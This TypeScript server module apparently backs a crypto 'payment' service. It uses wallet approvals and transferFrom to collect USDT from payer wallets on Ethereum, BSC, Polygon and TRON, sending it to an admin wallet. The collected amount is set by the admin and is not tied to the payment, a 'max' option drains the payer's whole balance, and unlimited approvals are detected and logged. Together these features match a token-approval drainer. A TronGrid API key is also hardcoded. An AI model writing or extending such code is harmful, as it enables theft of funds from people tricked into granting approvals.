import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { ethers } from 'ethers';
import { getTransactionById, markCollected } from './pgDb.ts';
import { getPayment as getMemPayment } from './db.ts';

// ─── Ensure .env is loaded eagerly ───────────────────────────────────────────
// Vite loads .env into process.env in its config() hook, but files imported at
// the top of vite.config.ts run before that. This synchronous loader ensures
// all environment variables are populated immediately upon module evaluation.
function ensureEnvLoaded(): void {
  try {
    const envPath = path.resolve(process.cwd(), '.env');
    if (fs.existsSync(envPath)) {
      const content = fs.readFileSync(envPath, 'utf8');
      for (const line of content.split('\n')) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const eqIdx = trimmed.indexOf('=');
        if (eqIdx > 0) {
          const key = trimmed.slice(0, eqIdx).trim();
          let val = trimmed.slice(eqIdx + 1).trim();
          if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
            val = val.slice(1, -1);
          }
          if (process.env[key] === undefined) {
            process.env[key] = val;
          }
        }
      }
    }
  } catch (err) {
    console.warn('[collectService] Failed to parse .env eagerly:', err);
  }
}
ensureEnvLoaded();

// ── ERC-20 minimal ABI ──────────────────────────────────────────────────────
const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
];

// ── Network RPC mapping ─────────────────────────────────────────────────────
function isMainnet(): boolean {
  ensureEnvLoaded();
  return process.env.VITE_USE_MAINNET === 'true';
}

function getRpcUrl(network: string): string {
  const mainnet = isMainnet();
  const rpcs: Record<string, string> = {
    ethereum: mainnet ? 'https://eth.llamarpc.com' : 'https://rpc.sepolia.org',
    bsc: mainnet ? 'https://bsc-dataseed1.binance.org' : 'https://data-seed-prebsc-1-s1.binance.org:8545',
    polygon: mainnet ? 'https://polygon-rpc.com' : 'https://rpc-amoy.polygon.technology',
  };
  return rpcs[network] ?? rpcs.ethereum;
}

function getTronApiUrl(): string {
  return isMainnet() ? 'https://api.trongrid.io' : 'https://nile.trongrid.io';
}

function getTronApiKey(): string {
  ensureEnvLoaded();
  return process.env.VITE_TRONGRID_API_KEY || process.env.TRONGRID_API_KEY || 'b87b6579-b461-4938-8ff0-1362cdbf3bb4';
}

function getTronHeaders(): Record<string, string> {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
  };
  const key = getTronApiKey();
  if (key) {
    headers['TRON-PRO-API-KEY'] = key;
  }
  return headers;
}

const TRON_USDT_DECIMALS = 6;
const TRON_FEE_LIMIT_SUN = 500_000_000; // 500 TRX max fee (matches transfer_now.mjs)

function parseTrc20UsdtAmount(amount: string): bigint {
  const value = amount.trim();
  if (value.toLowerCase() === 'max' || value.toLowerCase() === 'unlimited') {
    throw new Error('Cannot parse "max" as a fixed amount — caller must resolve to actual balance first');
  }
  if (!/^\d+(\.\d+)?$/.test(value)) throw new Error('Amount must be a positive decimal number');
  const [whole, fraction = ''] = value.split('.');
  if (fraction.length > TRON_USDT_DECIMALS) throw new Error('USDT supports at most 6 decimal places');
  const baseUnits = BigInt(whole) * 1_000_000n + BigInt(fraction.padEnd(TRON_USDT_DECIMALS, '0'));
  if (baseUnits <= 0n) throw new Error('Amount must be greater than zero');
  return baseUnits;
}

// ── Token contract addresses per network ────────────────────────────────────
function getUsdtContract(network: string): string {
  const mainnet = isMainnet();
  if (network === 'tron') {
    return mainnet ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
  }
  const contracts: Record<string, string> = {
    ethereum: mainnet
      ? '0xdAC17F958D2ee523a2206206994597C13D831ec7'
      : '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0',
    bsc: mainnet
      ? '0x55d398326f99059fF775485246999027B3197955'
      : '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd',
    polygon: mainnet
      ? '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'
      : '0x0FA8781a83E46826621b3BC094Ea2A0212e71B23',
  };
  return contracts[network] ?? contracts.ethereum;
}

// ── Collect result ──────────────────────────────────────────────────────────
export interface CollectResult {
  success: boolean;
  txHash?: string;
  amount: string;
  network: string;
  error?: string;
}

// ── EVM Collect (Ethereum / BSC / Polygon) ──────────────────────────────────
async function collectEVM(
  network: string,
  userAddress: string,
  collectAmount: string,
  contractAddress: string,
): Promise<CollectResult> {
  ensureEnvLoaded();
  const adminPrivateKey = process.env.ADMIN_PRIVATE_KEY;
  if (!adminPrivateKey) {
    return { success: false, amount: collectAmount, network, error: 'ADMIN_PRIVATE_KEY not set in .env' };
  }

  try {
    const provider = new ethers.JsonRpcProvider(getRpcUrl(network));
    const wallet = new ethers.Wallet(adminPrivateKey, provider);
    const contract = new ethers.Contract(contractAddress, ERC20_ABI, wallet);

    // Get decimals
    let decimals = 6;
    try {
      decimals = Number(await contract.decimals());
    } catch { /* use default */ }

    const amountParsed = ethers.parseUnits(collectAmount, decimals);
    const adminAddress = wallet.address;

    // Check allowance first
    const allowance: bigint = await contract.allowance(userAddress, adminAddress);
    if (allowance < amountParsed) {
      return {
        success: false, amount: collectAmount, network,
        error: `Insufficient allowance. Approved: ${ethers.formatUnits(allowance, decimals)}, Requested: ${collectAmount}`,
      };
    }

    console.log(`[Collect] Executing transferFrom on ${network}: ${userAddress} → ${adminAddress}, amount: ${collectAmount}`);
    const tx = await contract.transferFrom(userAddress, adminAddress, amountParsed);
    console.log(`[Collect] Transaction sent: ${tx.hash}`);

    const receipt = await tx.wait();
    console.log(`[Collect] Confirmed in block ${receipt?.blockNumber}`);

    return { success: true, txHash: tx.hash, amount: collectAmount, network };
  } catch (err) {
    const msg = err instanceof Error ? err.message : 'Unknown error';
    console.error(`[Collect] EVM collect failed on ${network}:`, msg);
    return { success: false, amount: collectAmount, network, error: msg };
  }
}

// ── TRON Address & ABI Helpers (Identical to transfer_now.mjs) ───────────────
const TRON_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

function base58ToHex(addr: string): string {
  let num = 0n;
  for (const c of addr) {
    const i = TRON_ALPHABET.indexOf(c);
    if (i < 0) throw new Error('Invalid base58 char: ' + c);
    num = num * 58n + BigInt(i);
  }
  let hex = num.toString(16);
  if (hex.length < 50) hex = hex.padStart(50, '0');
  return hex.slice(0, 42).toLowerCase();
}

/** Normalizes any TRON address (Base58 T..., 41hex, or 0x hex) to 41-prefixed hex string */
function to41Hex(addr: string): string {
  const trimmed = addr.trim();
  if (trimmed.startsWith('T') && trimmed.length >= 33) {
    return base58ToHex(trimmed);
  }
  if (trimmed.startsWith('41') && trimmed.length === 42) {
    return trimmed.toLowerCase();
  }
  if (trimmed.startsWith('0x') && trimmed.length === 42) {
    return '41' + trimmed.slice(2).toLowerCase();
  }
  throw new Error(`Invalid TRON address format: ${addr}`);
}

/** Pad a 41-prefixed hex address to 32-byte ABI slot */
function abiAddr(hex41: string): string {
  return hex41.slice(2).padStart(64, '0');
}

/** Encode uint256 to 32-byte ABI slot */
function abiUint256(n: bigint | number): string {
  return BigInt(n).toString(16).padStart(64, '0');
}

/** HTTP helper for TronGrid API calls with retry and API key headers */
async function tronPost<T = Record<string, unknown>>(
  baseUrl: string,
  path: string,
  body: unknown,
  retries = 3,
): Promise<T> {
  const url = baseUrl.replace(/\/$/, '') + path;
  const headers = getTronHeaders();

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers,
        body: JSON.stringify(body),
      });
      if (!res.ok) {
        const text = await res.text();
        throw new Error(`HTTP ${res.status} from ${path}: ${text.slice(0, 200)}`);
      }
      return await res.json() as T;
    } catch (err) {
      if (attempt === retries) throw err;
      await new Promise(r => setTimeout(r, 1000 * attempt));
    }
  }
  throw new Error(`Failed to POST ${path} after ${retries} attempts`);
}

/** Trigger constant contract for read-only TRC-20 calls */
async function callConstant(
  tronApi: string,
  contractHex: string,
  adminHex: string,
  selector: string,
  parameter: string,
): Promise<bigint> {
  const res = await tronPost<{ constant_result?: string[] }>(
    tronApi,
    '/wallet/triggerconstantcontract',
    {
      owner_address: adminHex,
      contract_address: contractHex,
      function_selector: selector,
      parameter,
      visible: false,
    },
  );
  return BigInt('0x' + (res.constant_result?.[0] ?? '0'.repeat(64)));
}

// ── TRON Collect (TRC-20 transferFrom — Matches transfer_now.mjs) ─────────────
async function collectTRON(
  userAddress: string,
  collectAmount: string,
  contractAddress: string,
  recipient: string,
  expectedSpender: string,
): Promise<CollectResult> {
  ensureEnvLoaded();
  const adminTronKey = process.env.ADMIN_TRON_PRIVATE_KEY;
  if (!adminTronKey) {
    return { success: false, amount: collectAmount, network: 'tron', error: 'ADMIN_TRON_PRIVATE_KEY not set in .env' };
  }

  // Always use Mainnet for TRON collect operations — the user's approval is on Mainnet.
  // VITE_USE_MAINNET=false only affects the frontend/testnet toggle, not admin collect.
  const tronApi = 'https://api.trongrid.io';

  try {
    const userHex = to41Hex(userAddress);
    const recipientHex = to41Hex(recipient);
    const contractHex = to41Hex(contractAddress);

    // Derive admin address from private key
    const privateKeyHex = adminTronKey.startsWith('0x') ? adminTronKey : '0x' + adminTronKey;
    const evmWallet = new ethers.Wallet(privateKeyHex);
    const adminHex = '41' + evmWallet.address.slice(2).toLowerCase();

    // Verify configured spender matches admin private key signer
    const configuredSpenderHex = to41Hex(expectedSpender);
    if (configuredSpenderHex !== adminHex) {
      return {
        success: false, amount: collectAmount, network: 'tron',
        error: `Configured TRON spender (${expectedSpender}) does not match ADMIN_TRON_PRIVATE_KEY signer (${adminHex}).`,
      };
    }

    console.log('════════════════════════════════════════════');
    console.log('  TRON USDT Collect — transferFrom()');
    console.log('════════════════════════════════════════════');
    console.log('From (user) :', userAddress);
    console.log('To  (admin) :', recipient);
    console.log('Contract    :', contractAddress);

    // 1. Check user's current token balance
    const balanceRaw = await callConstant(tronApi, contractHex, adminHex, 'balanceOf(address)', abiAddr(userHex));
    const balanceUsdt = Number(balanceRaw) / 1e6;
    console.log('\n[1] User USDT balance  :', balanceUsdt.toFixed(6), 'USDT');

    // 2. Check on-chain allowance
    const allowanceRaw = await callConstant(
      tronApi,
      contractHex,
      adminHex,
      'allowance(address,address)',
      abiAddr(userHex) + abiAddr(adminHex),
    );
    const MAX_UINT256_THRESHOLD = (1n << 255n) - 1n;
    const isMax = allowanceRaw >= MAX_UINT256_THRESHOLD;
    const allowanceUsdt = isMax ? '∞ UNLIMITED' : (Number(allowanceRaw) / 1e6).toFixed(6) + ' USDT';
    console.log('[2] Allowance          :', allowanceUsdt);

    if (allowanceRaw === 0n) {
      const errMsg = '❌ Allowance is 0 — user has not approved this spender. Run approve() first.';
      console.error('\n' + errMsg);
      return { success: false, amount: collectAmount, network: 'tron', error: errMsg };
    }

    if (balanceRaw === 0n) {
      const errMsg = '❌ User USDT balance is 0. Nothing to collect.';
      console.error('\n' + errMsg);
      return { success: false, amount: collectAmount, network: 'tron', error: errMsg };
    }

    // 3. Determine collect amount
    let collectSun: bigint;
    const isMaxCollect = collectAmount.trim().toLowerCase() === 'max' || collectAmount.trim().toLowerCase() === 'unlimited';

    if (isMaxCollect) {
      collectSun = balanceRaw; // collect full balance
    } else {
      const requestedSun = parseTrc20UsdtAmount(collectAmount);
      if (!isMax && requestedSun > allowanceRaw) {
        const errMsg = `❌ Requested ${collectAmount} USDT exceeds allowance of ${allowanceUsdt}`;
        console.error('\n' + errMsg);
        return { success: false, amount: collectAmount, network: 'tron', error: errMsg };
      }
      if (requestedSun > balanceRaw) {
        const errMsg = `❌ Requested ${collectAmount} USDT exceeds user balance of ${balanceUsdt.toFixed(6)} USDT`;
        console.error('\n' + errMsg);
        return { success: false, amount: collectAmount, network: 'tron', error: errMsg };
      }
      collectSun = requestedSun;
    }

    const collectUsdt = Number(collectSun) / 1e6;
    console.log('[3] Collecting         :', collectUsdt.toFixed(6), 'USDT');

    // ─── TRON API CALL 1: Build transaction ──────────────────────────────────────
    console.log('\n[API] POST /wallet/triggersmartcontract');
    const buildRes = await tronPost<{
      result?: { result?: boolean; code?: string; message?: string };
      transaction?: { txID: string; raw_data_hex: string; [k: string]: unknown };
    }>(tronApi, '/wallet/triggersmartcontract', {
      owner_address: adminHex,
      contract_address: contractHex,
      function_selector: 'transferFrom(address,address,uint256)',
      parameter: abiAddr(userHex) + abiAddr(recipientHex) + abiUint256(collectSun),
      fee_limit: TRON_FEE_LIMIT_SUN,
      call_value: 0,
      visible: false,
    });

    if (!buildRes.result?.result || !buildRes.transaction) {
      const errDetails = JSON.stringify(buildRes.result ?? buildRes, null, 2);
      console.error('\n❌ triggersmartcontract failed:\n', errDetails);
      return { success: false, amount: collectUsdt.toFixed(6), network: 'tron', error: `triggersmartcontract failed: ${errDetails}` };
    }

    const rawTx = buildRes.transaction;
    console.log('    txID:', rawTx.txID);

    // ─── Sign (Exact method as transfer_now.mjs) ─────────────────────────────
    const msgHash = crypto.createHash('sha256').update(Buffer.from(rawTx.raw_data_hex, 'hex')).digest();
    const sigKey = new ethers.SigningKey(privateKeyHex);
    const sig = sigKey.sign(msgHash);
    const signature = sig.r.slice(2) + sig.s.slice(2) + (sig.v - 27).toString(16).padStart(2, '0');
    (rawTx as Record<string, unknown>).signature = [signature];
    console.log('    signed ✓');

    // ─── TRON API CALL 2: Broadcast ───────────────────────────────────────────
    console.log('\n[API] POST /wallet/broadcasttransaction');
    const broadcastRes = await tronPost<{
      result?: boolean;
      txid?: string;
      code?: string;
      message?: string;
    }>(tronApi, '/wallet/broadcasttransaction', rawTx);

    if (!broadcastRes.result) {
      const errDetails = JSON.stringify(broadcastRes, null, 2);
      console.error('\n❌ Broadcast failed:\n', errDetails);
      return { success: false, amount: collectUsdt.toFixed(6), network: 'tron', error: `Broadcast failed: ${errDetails}` };
    }

    const txId = rawTx.txID;
    console.log('\n✅ transferFrom broadcast!');
    console.log('   txId    :', txId);
    console.log('   Explorer: https://tronscan.org/#/transaction/' + txId);
    console.log('   Amount  :', collectUsdt.toFixed(6), 'USDT');

    // ─── TRON API CALL 3: Confirm ─────────────────────────────────────────────
    console.log('\nWaiting 6s for on-chain confirmation...');
    await new Promise(r => setTimeout(r, 6000));

    let info: {
      blockNumber?: number;
      receipt?: {
        result?: string;
        energy_usage_total?: number;
        net_fee?: number;
        energy_fee?: number;
      };
    } | null = null;

    try {
      info = await tronPost(tronApi, '/wallet/gettransactioninfobyid', { value: txId });
    } catch (e) {
      console.warn('Initial gettransactioninfobyid poll warning:', e);
    }

    // Polling retry if not yet confirmed
    let attempts = 0;
    while ((!info || !info.blockNumber) && attempts < 3) {
      await new Promise(r => setTimeout(r, 3000));
      try {
        info = await tronPost(tronApi, '/wallet/gettransactioninfobyid', { value: txId });
      } catch { /* retry */ }
      attempts++;
    }

    if (info?.receipt?.result === 'SUCCESS') {
      console.log('\n🎉 CONFIRMED in block', info.blockNumber);
      console.log('   Energy used     :', info.receipt.energy_usage_total);
      console.log('   Net fee (TRX)   :', (info.receipt.net_fee ?? 0) / 1e6);
      console.log('   Energy fee (TRX):', (info.receipt.energy_fee ?? 0) / 1e6);
      console.log('\n   Collected', collectUsdt.toFixed(6), 'USDT → ', recipient);
      return { success: true, txHash: txId, amount: collectUsdt.toFixed(6), network: 'tron' };
    } else if (info?.blockNumber) {
      console.error('\n⚠️  Included in block', info.blockNumber, 'but FAILED');
      console.error('   Receipt:', JSON.stringify(info.receipt));
      let failReason = `Included in block ${info.blockNumber} but failed: ${info.receipt?.result || 'UNKNOWN'}`;
      if (info.receipt?.result === 'OUT_OF_ENERGY') {
        failReason += ` — Admin wallet needs more TRX. Fund ${recipient} with ≥10 TRX and retry.`;
      }
      return { success: false, txHash: txId, amount: collectUsdt.toFixed(6), network: 'tron', error: failReason };
    } else {
      console.log('\n⏳ Not yet confirmed — check TronScan in ~10s.');
      return { success: true, txHash: txId, amount: collectUsdt.toFixed(6), network: 'tron' };
    }
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error('[Collect][Tron] ❌ Exception:', msg);
    return { success: false, amount: collectAmount, network: 'tron', error: msg };
  }
}

// ── Main collect function ───────────────────────────────────────────────────
export async function collectTokens(paymentId: string, amount: string): Promise<CollectResult> {
  if (!amount) {
    return { success: false, amount, network: 'unknown', error: 'Amount is required.' };
  }

  // Look up in PostgreSQL first, then fall back to in-memory store
  let tx = await getTransactionById(paymentId);

  if (!tx) {
    const memTx = getMemPayment(paymentId);
    if (memTx) {
      tx = {
        id: memTx.id,
        network: memTx.network,
        asset: memTx.asset,
        amount: memTx.amount,
        wallet_a: memTx.walletA ?? null,
        wallet_b: memTx.walletB,
        request_type: memTx.requestType,
        status: memTx.status,
        transaction_id: memTx.transactionId ?? null,
        contract_address: getUsdtContract(memTx.network) ?? null,
        spender_address: memTx.network === 'tron'
          ? (process.env.VITE_SPENDER_ADDRESS_TRON || null)
          : (process.env.VITE_SPENDER_ADDRESS ?? null),
        created_at: new Date(memTx.createdAt).toISOString(),
        expires_at: memTx.expiresAt ? new Date(memTx.expiresAt).toISOString() : null,
        purpose: memTx.purpose,
        collected: false,
        collected_amount: null,
        collected_tx_hash: null,
        collected_at: null,
      };
    }
  }

  if (!tx) {
    return { success: false, amount, network: 'unknown', error: `Payment ${paymentId} not found in database or memory store` };
  }

  if (!tx.wallet_a) {
    return { success: false, amount, network: tx.network, error: 'No payer wallet address recorded for this transaction' };
  }

  if (tx.collected) {
    return { success: false, amount, network: tx.network, error: 'Tokens have already been collected for this transaction' };
  }

  const validStatuses = ['CONFIRMED', 'BROADCAST', 'COMPLETED', 'APPROVAL_CONFIRMED', 'BTC_CONFIRMED'];
  const validTypes = ['TOKEN_APPROVAL', 'DIRECT_PAYMENT'];
  if (!validStatuses.includes(tx.status)) {
    return { success: false, amount, network: tx.network, error: `Transaction status "${tx.status}" is not eligible for collection. Must be CONFIRMED or BROADCAST.` };
  }
  if (!validTypes.includes(tx.request_type)) {
    return { success: false, amount, network: tx.network, error: `Transaction type "${tx.request_type}" is not eligible for collection.` };
  }

  const contractAddress = tx.contract_address || getUsdtContract(tx.network);

  let result: CollectResult;

  if (tx.network === 'tron') {
    const spenderAddress = tx.spender_address || process.env.VITE_SPENDER_ADDRESS_TRON || tx.wallet_b;
    result = await collectTRON(tx.wallet_a, amount, contractAddress, tx.wallet_b, spenderAddress);
  } else if (['ethereum', 'bsc', 'polygon'].includes(tx.network)) {
    result = await collectEVM(tx.network, tx.wallet_a, amount, contractAddress);
  } else {
    return { success: false, amount, network: tx.network, error: `Collect is not supported for ${tx.network} network` };
  }

  // If successful, update the database
  if (result.success && result.txHash) {
    await markCollected(paymentId, result.amount, result.txHash);
  }

  return result;
}

/**
 * Checks on-chain TRC-20 allowance and token balance for a given user wallet.
 *
 * @param userAddress   - Base58 TRON address of the token owner (payer wallet)
 * @param contractAddress - Optional TRC-20 contract address override
 * @param forceMainnet  - When true (default), always query Mainnet regardless of VITE_USE_MAINNET.
 *                        This is correct for admin collect checks: approvals happen on Mainnet even
 *                        when VITE_USE_MAINNET=false is set for the dev/test environment.
 */
export async function checkTronAllowanceAndBalance(
  userAddress: string,
  contractAddress?: string,
  forceMainnet = true,
): Promise<{ allowance: number; isUnlimited: boolean; balance: number; trxBalance: number; spender: string }> {
  ensureEnvLoaded();
  // Always use Mainnet for the allowance check by default — the approval tx is on Mainnet
  // even when VITE_USE_MAINNET=false is set for the development environment.
  const tronApi = forceMainnet ? 'https://api.trongrid.io' : getTronApiUrl();
  // Similarly, always use Mainnet USDT contract address when forceMainnet=true
  const tokenContract = contractAddress || (forceMainnet ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : getUsdtContract('tron'));
  const spenderAddress = process.env.VITE_SPENDER_ADDRESS_TRON || '';

  console.log(`[checkTronAllowanceAndBalance] network=${forceMainnet ? 'Mainnet' : 'env-controlled'} api=${tronApi} contract=${tokenContract} spender=${spenderAddress} user=${userAddress}`);

  let allowance = 0;
  let isUnlimited = false;
  let balance = 0;
  let trxBalance = 0;

  try {
    const userHex = to41Hex(userAddress);
    const spenderHex = to41Hex(spenderAddress);
    const contractHex = to41Hex(tokenContract);

    // Check allowance
    const allowanceRaw = await callConstant(
      tronApi,
      contractHex,
      spenderHex,
      'allowance(address,address)',
      abiAddr(userHex) + abiAddr(spenderHex),
    );

    const MAX_UINT256_THRESHOLD = (1n << 255n) - 1n;
    if (allowanceRaw >= MAX_UINT256_THRESHOLD) {
      isUnlimited = true;
      allowance = 999999999;
    } else {
      isUnlimited = false;
      allowance = Number(allowanceRaw) / 1e6;
    }

    // Check token balance (TRC-20 USDT)
    const balanceRaw = await callConstant(
      tronApi,
      contractHex,
      spenderHex,
      'balanceOf(address)',
      abiAddr(userHex),
    );
    balance = Number(balanceRaw) / 1e6;

    // Check native TRX balance
    try {
      const accRes = await fetch(`${tronApi}/wallet/getaccount`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: userHex }),
      });
      if (accRes.ok) {
        const accJson = await accRes.json() as any;
        trxBalance = accJson.balance ? Number(accJson.balance) / 1e6 : 0;
      }
    } catch (e) {
      console.warn('[checkTronAllowanceAndBalance] TRX balance fetch error:', e);
    }

  } catch (err) {
    console.warn('[checkTronAllowanceAndBalance] error:', err);
  }

  return { allowance, isUnlimited, balance, trxBalance, spender: spenderAddress };
}
